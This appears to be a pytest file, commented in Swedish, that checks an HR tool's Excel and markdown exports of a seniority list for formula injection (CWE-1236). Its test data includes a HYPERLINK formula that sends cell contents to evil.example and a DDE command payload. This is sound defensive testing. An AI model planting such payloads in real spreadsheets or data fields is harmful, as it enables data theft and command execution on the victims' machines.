# -*- coding: utf-8 -*-
"""Excel-formelinjektion i turordningslistan (CWE-1236).

`generate_turordningslista_excel` skriver `employees`-fältens strängar rakt
in i cellvärden med `ws.cell(..., value=emp["name"])` — inget annat än
`str()`. Excel tolkar ett cellvärde som en formel om det börjar med
`=`, `+`, `-` eller `@`, oavsett om värdet kom från en formel-byggd sträng
eller en anställds namn i en HR-integration.

En anställd vars namn i källsystemet råkar vara, eller manipulerats till,
`=HYPERLINK("http://evil.example/"&A1,"Klicka här")` eller en DDE-payload
(`=cmd|'/c calc'!A1`) exekveras i samma stund HR-personen som beställde
listan öppnar filen i Excel. Det är exakt den attackklass OWASP kallar
CSV/Formula Injection, och den kräver ingen annan sårbarhet i servern —
bara att någon kan påverka ett namn-, titel- eller enhetsfält som senare
exporteras.

`start_date`/`birth_date` är inte med här: de går genom `strptime("%Y-%m-%d")`
och kan därför aldrig börja med `=+-@` — antingen parsas de till ett giltigt
datum, eller nollställs till en hårdkodad literal vid fel.
"""

import io

import pytest
from openpyxl import load_workbook

from src.mcp_tools.tools import generate_turordningslista_excel

DANGEROUS_PAYLOADS = [
    '=HYPERLINK("http://evil.example/"&A1,"Klicka här")',
    "=cmd|'/c calc'!A1",
    "+1+1",
    "-2+3",
    "@SUM(1+1)",
]


def _load_sheet1(res):
    wb = load_workbook(io.BytesIO(bytes.fromhex(res["file_base64_hex"]))) if False else None
    import base64
    xlsx_bytes = base64.b64decode(res["file_base64"])
    wb = load_workbook(io.BytesIO(xlsx_bytes))
    return wb["Turordningslista"]


@pytest.mark.parametrize("payload", DANGEROUS_PAYLOADS)
def test_a_malicious_employee_name_is_not_stored_as_a_live_formula(payload):
    res = generate_turordningslista_excel(
        company_name="Testbolaget AB",
        employees=[{
            "name": payload, "title": "Utvecklare", "driftsenhet": "Sthlm",
            "start_date": "2020-01-01", "birth_date": "1990-01-01",
            "has_qualifications": True, "is_exempt": False,
        }],
    )
    ws = _load_sheet1(res)
    stored_name = ws.cell(row=5, column=2).value
    assert not str(stored_name).startswith(("=", "+", "-", "@")), (
        f"anställdnamnet lagras som en levande formel: {stored_name!r}"
    )
    # Det ursprungliga innehållet ska fortfarande synas i klartext, bara
    # oskadliggjort — inte tystat eller ersatt.
    assert payload.lstrip("=+-@") in str(stored_name)


@pytest.mark.parametrize("field", ["title", "driftsenhet", "avtalsomrade"])
def test_every_free_text_employee_field_is_sanitised(field):
    res = generate_turordningslista_excel(
        employees=[{
            "name": "Anna Andersson", field: "=1+1",
            "start_date": "2020-01-01", "birth_date": "1990-01-01",
            "has_qualifications": True, "is_exempt": False,
        }],
    )
    ws = _load_sheet1(res)
    col = {"title": 3, "driftsenhet": 4, "avtalsomrade": 5}[field]
    value = ws.cell(row=5, column=col).value
    assert not str(value).startswith("="), f"{field} lagras som formel: {value!r}"


def test_a_malicious_company_name_does_not_become_a_formula_in_the_banner():
    res = generate_turordningslista_excel(company_name='=HYPERLINK("http://evil.example/")')
    ws = _load_sheet1(res)
    banner = ws["A1"].value
    # Banner-texten byggs med .upper() runt hela strängen, så det farliga
    # tecknet hamnar mitt i cellen - kontrollera att RADEN inte är en formel.
    assert not str(banner).startswith("="), f"bannern är en levande formel: {banner!r}"


def test_a_malicious_cba_name_does_not_become_a_formula_in_the_subtitle():
    res = generate_turordningslista_excel(cba_name='=1+1')
    ws = _load_sheet1(res)
    subtitle = ws["A2"].value
    assert not str(subtitle).startswith("="), f"undertexten är en levande formel: {subtitle!r}"


def test_the_datedif_formula_the_tool_builds_itself_still_works():
    """Sanering får bara träffa användarens strängar, inte verktygets egna formler."""
    res = generate_turordningslista_excel(employees=[{
        "name": "Anna", "start_date": "2020-01-01", "birth_date": "1990-01-01",
    }])
    ws = _load_sheet1(res)
    formula = ws.cell(row=5, column=7).value
    assert str(formula).startswith("=DATEDIF("), \
        f"den avsedda DATEDIF-formeln fick inte förstöras: {formula!r}"


def test_a_benign_name_is_completely_unaffected():
    res = generate_turordningslista_excel(employees=[{
        "name": "Anna Andersson", "start_date": "2020-01-01", "birth_date": "1990-01-01",
    }])
    ws = _load_sheet1(res)
    assert ws.cell(row=5, column=2).value == "Anna Andersson"


# Den genererade `.xlsx`-filen är inte den enda vägen ut. Verktyget returnerar
# också en `markdown_table` i samma JSON-svar, "för AI-chatten" (se kod-
# kommentaren i tools.py) — avsedd att visas i en chatt och sedan kopieras
# rakt in i ett kalkylark av den mänskliga mottagaren. Sanering vid
# `ws.cell(..., value=...)`-anropet skyddar bara filen, inte den här strängen:
# den byggs separat från `table_rows`, som fortfarande innehåller de
# osanerade fälten. Klistras raden in i Excel/Sheets (radvis, inte som ett
# enda textblock, vilket är hur ett kopierat HTML-/markdown-tabellklipp
# normalt hamnar i ett kalkylark) exekveras samma formel där.
@pytest.mark.parametrize("payload", DANGEROUS_PAYLOADS)
def test_markdown_table_does_not_leak_a_live_formula_for_employee_name(payload):
    res = generate_turordningslista_excel(
        employees=[{
            "name": payload, "title": "Utvecklare", "driftsenhet": "Sthlm",
            "start_date": "2020-01-01", "birth_date": "1990-01-01",
            "has_qualifications": True, "is_exempt": False,
        }],
    )
    for line in res["markdown_table"].splitlines():
        if payload.lstrip("=+-@") not in line:
            continue
        cell = line.split("|")[2].strip("* ")
        assert not cell.startswith(("=", "+", "-", "@")), (
            f"markdown_table läcker en levande formel för namnet: {line!r}"
        )


@pytest.mark.parametrize("field", ["title", "driftsenhet"])
def test_markdown_table_sanitises_title_and_driftsenhet(field):
    res = generate_turordningslista_excel(
        employees=[{
            "name": "Anna Andersson", field: "=1+1",
            "start_date": "2020-01-01", "birth_date": "1990-01-01",
            "has_qualifications": True, "is_exempt": False,
        }],
    )
    data_line = next(l for l in res["markdown_table"].splitlines() if "Anna Andersson" in l)
    col_index = {"title": 3, "driftsenhet": 4}[field]
    cell = data_line.split("|")[col_index].strip()
    assert not cell.startswith("="), f"{field} läcker en formel i markdown_table: {cell!r}"
